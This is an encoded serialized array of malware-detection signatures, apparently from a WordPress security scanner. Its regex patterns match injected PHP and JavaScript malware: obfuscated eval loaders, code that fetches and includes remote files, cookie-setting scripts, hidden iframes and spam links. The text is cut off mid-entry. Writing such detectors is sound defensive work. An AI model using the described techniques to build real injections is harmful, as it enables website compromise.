pZiBmaWxlX2V4aXN=cyBmaWxlX2dldF9jb25=ZW5=cyBnemluZmxhdGUgcHJlZ19yZXBsYWNlIjthOjI6e2k6MDtzOjU6IkdDVkc2IjtpOjE7czozNjI6Ii9cJChbYS16XzAtOV=rKVxzKj1bXjtdKlwkX1NFUlZFUltcc1xbXHtdKyhbIiddKShET=NVTUVOVF9ST=9UfFNDUklQVF9OQU1FKVwyW1xzXF1cfV=rLis_aWZccypcKFxzKmZpbGVfZXhpc3RzXHMqXCguKz9cJChbYS16XzAtOV=rKVxzKj1bXHNcQF=qKGZpbGVfZ2V=X2NvbnRlbnRzXHMqXChccypcJFwxLis_XCQoW2Etel8wLTldKylccyo9W1xzXEBdKmd6aW5mbGF=ZVxzKlwoXHMqXCRcNC4rP3ByZWdfcmVwbGFjZS4rP1wpO1tcfVxzXSt8c2NhbmRpclxzKlwoW147XSs7XHMqZm9yZWFjaFxzKlwoXCRcNC4rZndyaXRlXHMqXChbXjtdKztccypmY2xvc2VccypcKFteO1=rO1tcfVxzXSt1bmxpbmtccypcKFxzKlwkXDFcKTtccyopL2lzIjt9czo1NDoiZnVuY3Rpb24gZm91cm9mb3VyIGFkZF9maWx=ZXIgYWxsX3BsdWdpbnMgZm91cm9mb3VyX3BwIjthOjI6e2k6MDtzOjU6IkRCSE1tIjtpOjE7czo4MToiL2Z1bmN=aW9uIGZvdXJvZm91clwoXCkuK2FkZF9maWx=ZXJcKFsiJ11hbGxfcGx1Z2luc1ssICInXStmb3Vyb2ZvdXJfcHBbIiddXCk7L2lzIjt9czoxNDoicCBwYXlkYXkgbG9hbnMiO2E6Mjp7aTowO3M6NToiRzVCQ=siO2k6MTtzOjQ2OiIvPHBbXj5dKj5ccyouKz9wYXlkYXkgbG9hbi4rP1tcclxuXStccyo8XC9wPi9pIjt9czoyNjoic2NyaXB=IHNyYyBlYXJubW9uZXlkby5jb2=iO2E6Mjp7aTowO3M6NToiRzZIRnMiO2k6MTtzOjE2NToiLyg8KHNjcmlwdHxhKVtePl=rKGhyZWY9WyciXVtmaHRwc2w6XSpcL1wvKHNlY3VyZVwucGF5emEpW14-XSs-XHMqPGltZ1tePl=rKT9zcmM9WyciXVtmaHRwc2w6XSpcL1wvKFw=fG9ubGluZS1zYWxlMjR8ZWFybm1vbmV5ZG98Z2NjYW5hZGF8ZzAwKVwuY28uKz9ccyo8XC9cMj5ccyopKy9pIjt9czo5MjoicGhwIHZhciBhcnJheSB2YXIgdGV4dCBpZiBmdW5jdGlvbl9leGlzdHMgZnVuY3Rpb24gZm9yZWFjaCBjaHIgcmV=dXJuIHZhcmlhYmxlIGZ1bmN=aW9uIHRleHQiO2E6Mjp7aTowO3M6NToiRzRSS3MiO2k6MTtzOjMwMzoiLzxcP1twaFxzXSsoXCRbYS16XzAtOV=rKFxzKlxbW15cXV=rXF=rKSpbXHNcLlwrXC1dKj1ccyooKGFycmF5XCh8XCRceyk_KChbJyJdKS4qP1w2fFwkW2Etel8wLTldKyhccypcW1teXF1dK1xdKykqKVtcLlwsXHNcKVx9XSopKztccyopKygoaWZccypcKFteXHtdK1x7XHMqKT9mdW5jdGlvblteXHtdK1x7LipyZXR1cm5bXjtdKjtbXHNcfV=rKSsoaWZccypcKFteXHtdK1x7XHMqKT8oZWNob3xwcmludHxkaWUpW1xzXChce1=rXCRbYS16XzAtOV=rKFxzKlxbW15cXV=rXF=rKSpccypcKFteO1=qO1tcc1x9XSsoJHxcPz5ccyopL2lzIjt9czozNjoiVGFnZ2VkIGVycm9yX3JlcG9ydGluZyBiYXNlNjRfZGVjb2RlIjthOjI6e2k6MDtzOjU6IkZBOUNiIjtpOjE7czoxODM6Ii8oXC9cKi4rP1wqXC98PFwhLS=uKz8tLT4pXHMqKGlmW1woIFwhXStkZWZpbmVkXChbXlwpXStbXCkgXHtdKy4qP2RlZmluZVwoLis_XCkrO1tcc1x9XSopKigoXEB8XCRbYS16XF8wLTldK1xzKltcLj1dKykqKGVycm9yX3JlcG9ydGluZ3xpbmlfc2V=fG9iX3N=YXJ=KVwoLis_KStiYXNlNjRfZGVjb2RlXCguKz9cMS9pcyI7fXM6NDM6IlRhZ2dlZCBjcmVhdGVFbGVtZW5=IHNjcmlwdCBzcmMgYXBwZW5kQ2hpbGQiO2E6Mjp7aTowO3M6NToiRTJHQnUiO2k6MTtzOjE1MjoiL1wvXCogWzAtOWEtel=rIFwqXC9bXHJcbiBcdF=qLisoW2EtejAtOV=rKVtcdCA9XWRvY3VtZW5=XC5jcmVhdGVFbGVtZW5=XChbJyJdUy4rP1wxXC5zcmNbXHQ9IF=rLis_XC5hcHBlbmRDaGlsZFwoXDFcKS4rP1tcclxuIFx=XSpcL1wqIFswLTlhLXpdKyBcKlwvL2kiO31zOjM3OiJQSFAgVmFycyBDb25jYXQgVmFyaWFibGUgRnVuY3Rpb24gRU5EIjthOjI6e2k6MDtzOjU6IkY1UkJXIjtpOjE7czoyNjQ6Ii88XD9bcGhcc1=rKFwkW2EtelxfMC=5XSsoXHMqXFtbXlxdXStcXSspKlxzKj1bXjtdKztccyopKygoXCRbYS16XF8wLTldKyhccypcW1teXF1dK1xdKykqXHMqPVxzKik_KFwkW2EtelxfMC=5XSsoXHMqXFtbXlxdXStcXSspKnxzdHJfcmVwbGFjZXxjcmVhdGVfZnVuY3Rpb24pXChbXjtdKztccyopKygoXCRbYS16XF8wLTldKyhccypcW1teXF1dK1xdKykqXHMqPVxzKik_XCRbYS16XF8wLTldKyhccypcW1teXF1dK1xdKykqXChbXjtdKztccyopKyhcPz58JCkvaSI7fXM6NjU6ImRpdiBzY3JpcHQgZG9jdW1lbnQgZ2V=RWxlbWVudEJ5SWQgdmlzaWJpbGl=eSBoaWRkZW4gZGlzcGxheSBub25lIjthOjI6e2k6MDtzOjU6IkY1SjdjIjtpOjE7czoyNDg6Ii88ZGl2IGlkPVsnIl=oW2EtelxfMC=5XSspWyciXS4rPzxcL2Rpdj5ccyo8c2NyaXB=W14-XSo-XHMqKChmdW5jdGlvblxzKD8haGlkZW1lc3NhZ2UpKFthLXpcXzAtOV=rKXxpZilbXHNcKF=rW15cKV=qW1wpXHNce1=qKT8oZG9jdW1lbnRcLmdldEVsZW1lbnRCeUlkXChbIiddXDFbIiddXClcLnN=eWxlXC4odmlzaWJpbGl=eXxkaXNwbGF5KVxzKj1ccypbIiddKGhpZGRlbnxub25lKVsiJ1=7XHMqKStbXHNcfV=qPFwvc2NyaXB=Pi9pIjt9czo=NzoiYWRkX2FjdGlvbiB3cF9mb29=ZXIgc2VydmUgZXhhbXBsZV9hZG1pbl9ub3RpY2UiO2E6Mjp7aTowO3M6NToiR=IzQ=wiO2k6MTtzOjE2MzoiLyhhZGRfYWN=aW9uXChccypbJyJdKHdwX2Zvb3Rlcnxpbml=fGFkbWluX25vdGljZXMpWyciXVssXHNdKyhcQD9jcmVhdGVfZnVuY3Rpb25bXHNcKF=rKT9bJyJdKC4rP2Jhc2U2NF9kZWNvZGUuKz98ZXhhbXBsZV9hZG1pbl9ub3RpY2V8c2VydmUpWyciXVtcc1wpXSs7XHMqKXsyLH=vaSI7fXM6NTE6IlBIUCBlcnJvcl9yZXBvcnRpbmcgaWYgIWlzc2V=IHZhcmlhYmxlIGZ1bmN=aW9uIEVORCI7YToyOntpOjA7czo1OiJHM=5NViI7aToxO3M6MTkxOiIvKChlcnJvcl9yZXBvcnRpbmdccypcKHxcJFthLXpfMC=5XStccyo9KVteO1=rO1xzKikqaWZccypcKC4rP1wpK1xzKlx7XHMqKChcJFthLXpfMC=5XSspXHMqPVteO1=rO1xzKikqKChcJFthLXpfMC=5XSspXHMqPStccyopP1w=XHMqXCguKz8oXCRbYS16XzAtOV=rXHMqPVxzKik_XDZccypcKFteXCldKlwpK1tccyciXCk7XSpcfS9pcyI7fXM6NjY6InNjcmlwdCBpZiBuYXZpZ2F=b3IgdXNlckFnZW5=IG1hdGNoIGRvY3VtZW5=IHdyaXRlIHNjcmlwdCBzcmMgaHR=cCI7YToyOntpOjA7czo1OiJFM1FDZCI7aToxO3M6MTQ=OiIvPHNjcmlwdD5bXHRcclxuIF=qaWZbXHQgXChdK25hdmlnYXRvclwudXNlckFnZW5=XC5tYXRjaFwoLis_XHtbXHRcclxuIF=qZG9jdW1lbnRcLndyaXRlXChbIiddPHNjci4rPyBzcmM9WyciXWh=dHAuKz9cKVs7XH=gXHRcclxyXSs8XC9zY3JpcHQ-L2kiO31zOjYxOiJwaHAgZnVuY3Rpb24gQXJyYXkgcmV=dXJuIGJhc2U2NF9kZWNvZGUgcGhwIFZhcmlhYmxlIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkczSUFhIjtpOjE7czoyMzk6Ii8oZnVuY3Rpb25ccysoW2Etel8wLTldKylccypcKFxzKihcJFthLXpfMC=5XSspW1wpXHNce1=rXDNbPVxzXStnemluZmxhdGVcKGJhc2U2NF9kZWNvZGVcKC4rW1wpO1xzXSspP2ZvclxzKlwoW15ce1=rXHtccyooXCRbYS16XzAtOV=rKShccypcW1teXF1dK1xdKykqW1wuXHNdKj1bXEBcc1=qY2hyXChbXjtdK1s7XHNcfV=rKHJldHVyblteO1=qWztcfVxzXSspP2V2YWxcKChcMlwofFw=KVteXCldKltcKVxzXSs7Ki9pIjt9czoyNToiaW5jbHVkZV9vbmNlIHJzcy1pbmZvLnBocCI7YToyOntpOjA7czo1OiJHMzJJQSI7aToxO3M6MTQ5OiIvKChcJFthLXpfMC=5XSspXHMqPS4rP1wuKGpzfHBuZ3xnaWYpWyciXTtccyooaWZbXHNcKF=rfGlzX3xmaWxlfF9leGlzdHMpezMsfVtcKFxzXStcMltcKVxzXSspP1xAP2luY2x1ZGVfb25jZVwoWyciXHNdKihcMi4qP3xyc3MtaW5mb1wucGhwWyciXSlcKTsvaSI7fXM6MjE6ImlzX2JvdCBfX3ZpYV9jb25=ZW5=KSI7YToyOntpOjA7czo1OiJHOU1CViI7aToxO3M6Mjg3OiIvKHZhclxzKyhbYS16XzAtOV=rKVxzKj1bXjtdKztccyopKihmdW5jdGlvblxzKyhbXlwoXSpjb29raWVbXlwoXSp8W2EtejAtOV17NDF9KVwoW15ce1=qXHsuKj8oKGRvY3VtZW5=LmNvb2tpZVteO1=rKDtccypbJyJdKT98cmV=dXJufGlmXHMqXChkb2N1bWVudFwucmVmZXJyZXJbXlx7XStce1xzKlwyXHMqPSlbXjtdKjtccyooXH1ccyopKykrKXs1LH=oXCgqZnVuY3Rpb25ccyooW1woXCldK3xbYS16MC=5XXs=MX1cKFteXHtdKilccypcey4qP1wpO1xzKlx9W1wpXHNdKlwxMFxzKjtccyopezIsfS9pcyI7fXM6NDE6InNldCB2YXIgc3RyX3JlcGxhY2UgdmFyIHZhcmlhYmxlIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkY3TUM3IjtpOjE7czozMTc6Ii8oKFwkW2EtelxfMC=5XSsoXHMqXFtbXlxdXStcXSkqKVxzKj1ccypcQD9cJFthLXpcXzAtOV=rKFxzKlxbW15cXV=rXF=rKSpccypcKFxAP1wkXyhSRVFVRVNUfEdFVHxQT1NUfENPT=tJRSkoXHMqXFtbXlxdXStcXSspKlwpO1xzKikrKFwkW2EtelxfMC=5XSt8cHJlZ19yZXBsYWNlKVxzKlwoXHMqKFsnIl=pKFtcIVwvXCNcfFxAXCVcXlwqXH5dKS4rP1w5W2ltc3hdKmVbaW1zeF=qXDhccyosXHMqXDJccyosKChbXCRhLXpcXzAtOV=rKFxzKlxbW15cXV=rXF=pKnwnW14nXSonfCJbXiJdKiIpW1wuXHNdKikrXCkrO1xzKihkaWVcKFteXCldKlwpKzspPy9pIjt9czo2NDoiVGFnZ2VkIGVycm9yX3JlcG9ydGluZyBjdXJsX2luaXQgZmlsZV9nZXRfY29udGVudHMgZndyaXRlIHNjcmlwdCI7YToyOntpOjA7czo1OiJHNUhFNSI7aToxO3M6NDgxOiIvPFw_W3BoXHNdKyhbXEBcL1wjXHNdKihlcnJvcl9yZXBvcnRpbmd8aW5pX3NldHxzZXRfdGltZV9saW1pdHxoZWFkZXIpXHMqXChbXlwpXSpbXCk7XHNdKykqKChbO1xzXSooXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKnxlbHNlW1xzXHtdKikqaWZccypcKFteO1=rKSsoKGZpbGVfZ2V=X2NvbnRlbnRzXHMqXCh8bWtkaXJccypcKHxjdXJsX1thLXpdK1xzKlwofGRpZVxzKlwofChlY2hvfHByaW5=KVteO1=rO1xzKihyZXR1cm58ZXhpdCkpW15cfV=rXH1ccyopKykrKGVsc2VbXHNce1=qKT8oXCRbYS16XzAtOV=rXHMqPVxzKmZpbGVfZ2V=X2NvbnRlbnRzXChbXjtdKztbXH1cc1=qKSooXC8qKFwkW2Etel8wLTldK1xzKj=pP1tcQFxzXSooZm9wZW58ZndyaXRlfGZjbG9zZSlccypcKFteO1=rO1xzKil7Myx9KChoZWFkZXJ8ZWNob3xwcmludHxpZlxzKlwoW15ce1=rW1x7XHNdKmNobW9kXHMqXCgpW147XSo7W1x9XHNdKykrKCR8XD8-XHMqKS9pIjt9czo3MDoiZmlsZV9leGlzdHMgY3VybF9pbml=IGZpbGVfZ2V=X2NvbnRlbnRzIGZpbGVfcHV=X2NvbnRlbnRzIGluY2x1ZGVfb25jZSI7YToyOntpOjA7czo1OiJIMTU5NiI7aToxO3M6MjMyOiIvKFwkW2Etel8wLTldKylccyo9XHMqLis_KGN1cmxfaW5pdHxmaWxlX2dldF9jb25=ZW5=c1woW1xzJyJdK2h=dHBbc1w6XC9dKykuKz9maWxlX3B1dF9jb25=ZW5=c1woXDEuKz8oaW5jbHVkZV9vbmNlfChcJFthLXpfMC=5XSspXHMqPVxzKm5ld1xzK1thLXpfMC=5XSspXChcMS4qP1wpO1xzKiguKlw=W147XSo7XHMqfFx9XHMqfGVsc2Vccyp8XHtccyp8ZGllW1xzXCgnIl=rW15cKV=qXCkrO1xzKikqL2lzIjt9czozODoibG9uZyBzdHJpbmcgdmFyIGV2YWwgdmFyaWFibGUgZnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRzZMOWIiO2k6MTtzOjQyMToiLzwoXD98c2NyaXB=IGxhbmd1YWdlPSlbcGhccyciPl=rKFwkW2Etel8wLTldKyhccypcW1teXF1dK1xdKykqW1xzXC5dKj1ccyooKFsnIl=pW15cNV=rXDV8W147XSspO1xzKnxcL1wvLipccyp8XC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKnxmb3IoZWFjaCk_W1xzXChdK1teXHtdK1x7W15cfV=rXH=rW1x9XHNdKykrKFw_PlxzKjxcP1twaFxzXSspKigoKGV2YWx8aWYoW1xzXChcIVxAXStbYS16XzAtOV=rKT8pXHMqXCgpKihcJFtcJFx7XSpbYS16XzAtOV=rW1x9XHNcKV=qKFxbW15cXV=rXF1ccyp8PStccyooXCRbYS16XzAtOV=rfGNyZWF=ZV9mdW5jdGlvbikpKltcKVxzXHs7XH1dKikrXCguKj9bXClcc1x9O1=rKSsoZWNob1teO1=rO1xzKnxcL1wqW15cKl=qKFwqW15cKlwvXSopK1wvXHMqKSooXD8-fCR8PFwvc2NyaXB=PikvaSI7fXM6NDE6InBocCB2YXIgZXhwbG9kZSBudW1iZXJzIFZhcmlhYmxlIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkczOUtYIjtpOjE7czoyMTM6Ii88XD9bcGhcc1=rKGlmXHMqXCgoW15ce1=rW1x7XHNdKlwkR=xPQkFMU1tce1xbXVsnIl1cXHhbXjtdKztbXH1cc1=qKSsoXD8-XHMqPFw_W3BoXHNdKykpP1wkW2EtelxfMC=5XStccyo9XHMqKCcuKz8nfCIuKz8iKTtccyouKj9ccypcJFthLXpfMC=5XStccyo9XHMqZXhwbG9kZVwoW14sXStbLCInXC4wLTlcc1=rXCk7XHMqLio_XCRbYS16XzAtOV=rXHMqXCguKj9cPz4vaSI7fXM6OTM6ImZ1bmN=aW9uIFggaWYgZnVuY3Rpb25fZXhpc3RzIGN1cmxfaW5pdCBzcGFtY2hlY2tyLmNvbSBjdXJsX2V4ZWMgY3VybF9jbG9zZSBlY2hvIGFkZF9hY3Rpb24gWCI7YToyOntpOjA7czo1OiJHNUw4OCI7aToxO3M6NTM2OiIvKFwvXCouKj9cKlwvXHMqKSooXD8-XHMqPFw_W3BoXHNdKik_KGlmXHMqXChbXlx7XStce1xzKmZ1bmN=aW9uXHMrKFthLXpfMC=5XSspXChbXlx7XStce1xzKik_aWZbXHNcKFwhXStmdW5jdGlvbl9leGlzdHNcKFxzKlsnIl=oW2Etel8wLTldKylbJyJdW1xzXCldK1x7XHMqKChmdW5jdGlvblxzK1w1XCgpPy4rPyhzcGFtY2hlY2tyXC5jb218amF2YXRlcm=xXC5wd3xbJyJdanF1ZXJ5XC4pLis_Y3VybF9pbml=Lis_Y3VybF9leGVjLis_Y3VybF9jbG9zZVteO1=rWztcc1=rZWNob3xmdW5jdGlvblxzK1w1XHMqXChbXlwpXSpbXClcc1=rXHtccyooXCRbYS16XzAtOV=rXHMqPVteO1=rWztcc1=rKSooaWZbXHNcKF=rXEA_KFwkfGZvcGVuW1xzXChdKylbXlx7XStbXHtcc1=qKT9lY2hvXCh3cF9yZW1vdGVfcmV=cmlldmVfYm9keVwod3BfcmVtb3RlX2dldFwoKVteO1=rO1tcc1x9XSsoYWRkX2FjdGlvblteXCxdK1wsXHMqWyciXShcNXxcNClbJyJdW1xzXCk7XStcfSk_KFxzKlw_PlxzKjxcP1twaF=qKT8oXHMqXC9cKi4qP1wqXC8pKi9pcyI7fXM6OTY6ImlmIGZ1bmN=aW9uX2V4aXN=cyBmdW5jdGlvbiBlcnJvcl9yZXBvcnRpbmcgVmFyaWFibGUgeEZGIEgqIGlmIGZpbGVfZXhpc3RzIGVycm9yX3JlcG9ydGluZyBlbmRpZiI7YToyOntpOjA7czo1OiJFOTJHcCI7aToxO3M6MjcwOiIvaWZbIFwoXCFdK2Z1bmN=aW9uX2V4aXN=c1woWyAnIl=rKC4rPylbICciXStbXCkgXHRdK1w6Lis_ZnVuY3Rpb24gXDFcKFwpIFx7Lis_ZXJyb3JfcmVwb3J=aW5nXCgwLis_KFwkKFthLXowLTlcX1=rKVsgPVx=XSsiKFxceFswLWZdezJ9KSsiO1tcdCBcclxuXSsoXCQoW2EtejAtOVxfXSspWyA9XHRdK1wkKFthLXowLTlcX1=rKVwoIkhcKiJcLC4rPztbXHQgXHJcbl=rKSspK2lmWyBcKFwhXStmaWxlX2V4aXN=cy4rP2Vycm9yX3JlcG9ydGluZ1woXCQuKz9lbmRpZjsvaXMiO31zOjE3OiJpbmNsdWRlIEltYWdlRmlsZSI7YToyOntpOjA7czo1OiJIMTJKMSI7aToxO3M6MjU2OiIvKD88IVwvXC9cc3s4fSlcQD8oaW5jbHVkZXxyZXF1aXJlKShfb25jZSk_W1woXHNdK1thLXpfMC=5LFwuJ1xzIlwvXC1dKz8oPzwhR=RfU1lTVEVNX1BMVUdJTl9ESVIgXC4gJ1wvaW1hZ2VzXC8=MDQpKFwuKGdpZnxqcGd8cG5nfGNidXxjc3N8W1xzIiddK1wvd3AtaW5jbHVkZXNcL2luaXRcLnBocHxbXHMiJ1=rXC93cC1hZG1pblwvaW5jbHVkZXNcL2NsYXNzLXdwLWl=ZXJuYWwtdXBncmFkZVwucGhwKXx3cC1qYXZhXC5waHApWyInXHNcKV=rOy9pIjt9czo=MToiL2Z1bmN=aW9uIGFycmF5IFZhcmlhYmxlIEZ1bmN=aW9uIGlmIGV2YWwiO2E6Mjp7aTowO3M6NToiRzJOTkMiO2k6MTtzOjM1NjoiLyhcL1wqW15cKl=qKFwqW15cKlwvXSopK1wvXHMqKSooKFwkW19cLT5cLmEtejAtOV=rKVxzKj1bXjtdKztccyooW2Etel8wLTldKylcKFteXCldKlw=W15cKV=qW1wpXHM7XStccypmdW5jdGlvblxzKlw1fGZ1bmN=aW9uXHMqW2Etel8wLTldKylccypcKFteXHtdK1x7XHMqKFwkW19cLT5cLmEtejAtOV=rKVxzKihcW1teXF1dK1xdK1xzKikqPVxzKmFycmF5KF9tYXApP1xzKlwoLis_XCk7XHMqKFwkW19cLmEtejAtOVxbJyJcXVxzXSsoPVteO1=qXDZbXjtdKjtccyp8XCguKz9pZltcc1woXSpcJFtfXC5hLXowLTlcWyciXF1cc1=rXClccypceykpK1xzKihyZXR1cm5ccyopP2V2YWxccypcKFteXCldK1tcKVxzO1x9XSsvaXMiO31zOjQzOiJUYWdnZWQgZXJyb3JfcmVwb3J=aW5nIEhUVFBfVVNFUl9BR=VOVCBjdXJsIjthOjI6e2k6MDtzOjU6IkczTjdnIjtpOjE7czoyMjA6Ii8oZXJyb3JfcmVwb3J=aW5nXHMqXChbXjtdKztccyp8XCRbYS16XzAtOV=rXHMqPVxzKmFycmF5XHMqXChbXlwpXStcKStbO1wpXHNdKikqaWZccypcKFteXCldK=hUVFBfVVNFUl9BR=VOVCguKz9odHRwOlwvXC98Lis_Y3VybF9pbml=KXsyLH=uKz8oXCRbYS16XzAtOV=rKT9bXHM9XSpjdXJsX2V4ZWMuKz8ocHJpbnR8ZGllfGVjaG8pWyciXHNcKF=rXDNbJyJcc1wpO1x9XStccyovaXMiO31zOjMwOiJoZWFkZXIgTG9jYXRpb24gaHR=cCBzcGFjZS5waHAiO2E6Mjp7aTowO3M6NToiRTk5RHAiO2k6MTtzOjYzOiIvaGVhZGVyXChbJyJdTG9jYXRpb246IGh=dHA6XC9cL1teXC9dK1wvc3BhY2VcLnBocFw_W15cKV=rXCk7L2kiO31zOjUwOiJDb3B5cmlnaHQgZnVuY3Rpb24gZ2V=Q29va2llIGRvY3VtZW5=LndyaXRlIGlmcmFtZSI7YToyOntpOjA7czo1OiJGOVVBeCI7aToxO3M6OTE6Ii8oXC9cKi4rP1wqXC8pXHMqZnVuY3Rpb25ccysoW2Etel8wLTldKylcKC4rP25hdmlnYXRvclwudXNlckFnZW5=Lis_PGlmcmFtZSAuKz9cMlwoLis_XDEvaXMiO31zOjM3OiJDb3B5cmlnaHQgZnVuY3Rpb24gc2V=Q29va2llIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkYxQ=ZvIjtpOjE7czoxOTc6Ii9cL1wqXHMqQ29weXJpZ2h=LitccypcKlwvXHMqKGZ1bmN=aW9uIFtzZ11ldENvb2tpZVwoLis_cmV=dXJuW147XSpbO1x9XHNdKykqZnVuY3Rpb24gKFthLXowLTlcX1=rKVwoXClbXHtcc1=rKFthLXowLTlcc1w9XStuYXZpZ2F=b3JcLnVzZXJBZ2VudC4rP3xmdW5jdGlvblxzKylbc2ddZXRDb29raWVcKC4rP1wyXChbXjtdK1s7XH1cc1=rL2lzIjt9czoyMToicGhwIGhleC1lbmNvZGVkLWxpbmVzIjthOjI6e2k6MDtzOjU6IkYxNEhrIjtpOjE7czo2MDoiLzxcP1twaFxzXSsoW147XSpceFswLTlhLWZdezJ9W147XSpbO1xzXSspezksfS4qXHMqKFw_PnwkKS9pIjt9czozNToicGhwIGFycmF5IGh=dHAgbXRfcmFuZCBtZXRhIHJlZnJlc2giO2E6Mjp7aTowO3M6NToiRUEyRHYiO2k6MTtzOjIwMzoiLzxcPyhwaHApP1tcclxuIFx=XSpcJFthLXpcXzAtOV=rW1x=ID1dK2FycmF5WyBcKFxyXG5cdF=rKFsnIl1odHRwLitbLCBcKTtcclxuXHRdKykrXCRbYS16XF8wLTldK1tcdCA9XSttdF9yYW5kXCguK1sgXCk7XHJcblx=XSsoXCRbYS16XF8wLTldK1tcdCA9XSsuK1tcclxuIFx=XSopK1w_PlsgXHJcblx=XSo8bWV=YSAoLis_PFw_Lis_XD8-KSouKj8-L2kiO31zOjQ=OiJwaHAgYXJyYXkgZnVuY3Rpb24gcmV=dXJuIGJhc2U2NF9kZWNvZGUgZXZhbCI7YToyOntpOjA7czo1OiJGN1EwRCI7aToxO3M6MjI1OiIvPFw_W3BoXHNdK1wkW19cLVw-XC5hLXowLTlce1xbJyJcXVx9XStccyo9XHMqYXJyYXlcKC4rP2Z1bmN=aW9uXHMrKFthLXpfMC=5XSspXCgoLis_O1xzKikrKChcJFthLXpfMC=5XStccyo9XHMqKT8oZXZhbHxcJFthLXpfMC=5XSsoXHMqXFtbXlxdXStcXSkqKVxzKlwoXHMqKFwkXyhSRVFVRVN8R=V8UE9TKVRcWyk_W15cKV=rW1wpO1xzXSsoZXhpdHxkaWUpW147XSo7XHMqKSsoJHxcPz4pL2kiO31zOjU2OiJwaHAgaWYgaXNzZXQgR=xPQkFMUyBzdHJ=b2xvd2VyIFNFUlZFUiBpZiBzdHJzdHIgR=xPQkFMUyI7YToyOntpOjA7czo1OiJFQUFFZCI7aToxO3M6MjQxOiIvPFw_W3BoXSpccytpZltcKFxzXStcIWlzc2V=W1woXHNdK1wkR=xPQkFMU1xbIlxceFteXF1dK1tcXVwpXHNce1=rKFwkW2Etel8wLTldKylbXHM9XStzdHJ=b2xvd2VyW1woXHNdK1wkX1NFUlZFUlxbIlxceFteXF1dK1tcXVwpO1xzXSsoKGlmfGFuZClbXChcc1whXStzdHJzdHJbXChcc1=rXDFbXHMsIiddK1xceFteXCldK1tcKVxzXHtdKykrXCRHTE9CQUxTXFsiXFx4W15cXV=rXF1bXjtdKjtbXH1cc1=rKFw_PnwkKS9pIjt9czo=MjoiZnVuY3Rpb24gcmV=dXJuIGZ1bmN=aW9uIFZhcmlhYmxlIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkVBS=FCIjtpOjE7czoyMDI6Ii8oZnVuY3Rpb25bYS16XzAtOVxzXStcKFteXCldKltcKVxzXStce1xzKnJldHVyblthLXpfMC=5XHNdK1woW15cKV=qW1wpXHNdKzsqXH=rXHMqKSsoXCRbYS16XzAtOV=rWz1cc1=rKFthLXpfMC=5XHNdK1woW15cKV=qW1wpXHNdK3xbJyJdW147XSopOytccyopKyhcJFthLXpfMC=5XSspWz1cc1=rW147XStbJyJcKTtdK1xzKlw=XHMqXCgrLio_XCk7L2kiO31zOjE3OiJldmFsIGNociBSRVBFQVRFRCI7YToyOntpOjA7czo1OiJHNUJOYSI7aToxO3M6MjEyOiIvKDxcP1twaF=qfFwvXCpbXlwqXSpcKlwvKVxzKigoXCRbYS16XzAtOV=rKVxzKj1ccyonKT8oLis_XC5ccypjaHJcKFswLTldK1wpXHMqXC4pezIwfS4rXHMqKFwzXHMqPVxzKnN=cl9yZXBsYWNlXCgnXCNbJyxcc1=rXDNcKTtccyopPygoXCRbYS16XzAtOV=rKVxzKj1ccypjcmVhdGVfZnVuY3Rpb25cKFsnXHMsXSpcM1wpO1xzKlw3XChcKTspPyhcPz5ccyp8JHxcMSkvaSI7fXM6MzY6ImdhcmJhZ2UgYXJvdW5kIGV2YWwgVmVyaWFibGVGdW5jdGlvbiI7YToyOntpOjA7czo1OiJHNU42YiI7aToxO3M6MjQ4OiIvPFw_W3BoXHNdKyhcJFthLXpfMC=5XStbXHNcLl=qPShbXHNcLl=qKChbIiddKS4rPyg_PCFfZSlcNHxcL1wqW15cKl=qKFwqW15cKlwvXSopK1wvfFwkW1wkXHtdKlthLXpfMC=5XSpbXH1cc1=qKFxbW15cXV=rXF=rXHMqKSopKSs7XHMqKSsoKGV2YWx8aWYpXHMqXCgpP1wkW1wkXHtdKlthLXpfMC=5XStbXH1cc1=qKFxbW15cXV=rXF1bXHNdKikqXCguKj8oLisnW1wuO1wpXSspPyhccyonLisnW1wuO1wpXSspKlxzKihcPz58JCkvaSI7fXM6NTY6ImlmIGRlZmluZWQgZGVmaW5lIGZ1bmN=aW9uIGdsb2JhbCBldmFsIFZhcmlhYmxlIEZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkcxSExmIjtpOjE7czoxOTc6Ii9pZltcKFxzXStcIWRlZmluZWRcKFteXCldK1tcKVxzXStce1xzKmRlZmluZVwoW15cKV=rW1wpXHNdKztccypmdW5jdGlvblteXChdKlwoW15cKV=qW1wpXHNdK1x7XHMqZ2xvYmFsIChcJFteO1=rKTtccyooLis_XHMqKStldmFsXChcMShcW1teXF1dK1xdXHMqKSpcKFteXCldKltcKVxzXSs7KFxzKnJldHVyblteO1=qOyk_XHMqXH1ccypcfS9pIjt9czoyNToiaWZyYW1lIHNtYWxsIGhlaWdodHx3aWR=aCI7YToyOntpOjA7czo1OiJHM1M4ZiI7aToxO3M6MTUzOiIvKDxzY3JpcHRbXj5dK3NyYz1bJyJdP2h=dHBcOlwvXC8oW2EtelwuXC=wLTldKylbXj5dKj48XC9zY3JpcHQ-KT88aWZyYW1lLio_KFxzKihoZWlnaHR8d2lkdGh8c3JjKT1bJyJdPyhbMC=1XVsnIlxzXXxodHRwXDpcL1wvLis_KSl7M31bXj5dKj48XC9pZnJhbWU-L2kiO31zOjQ5OiJwaHAgZ2xvYmFsIGFycmF5IGZ1bmN=aW9uX2V4aXN=cyByZXR1cm4gZm9yIHVuc2V=IjthOjI6e2k6MDtzOjU6IkVDODFPIjtpOjE7czoyNjE6Ii9nbG9iYWwgKFwkW2EtejAtOVxfXSspO1xzKlwxW1xzPV=rYXJyYXlcKC4rP2Z1bmN=aW9uX2V4aXN=c1woW15cKV=rW1wpXHNcJl=rXCFmdW5jdGlvbl9leGlzdHNcKFsnIl=oW2EtejAtOVxfXSspWyciXVtcKVxzXHtdK2Z1bmN=aW9uXHMrXDJcKFteXCldK1tcKVxzXHtdK2dsb2JhbCBcMTsuKz9yZXR1cm5bXjtdKls7XHNcfV=rZm9yXHMqXChbXlwpXSpbXCk7XH1dKyhce1xzKltcJGEtejAtOVxfXStcKFteXCldK1tcKTtcfV=rKT91bnNldFwoXDFcKTsvaSI7fXM6MTM6ImV2YWwgcGFjayBIZXgiO2E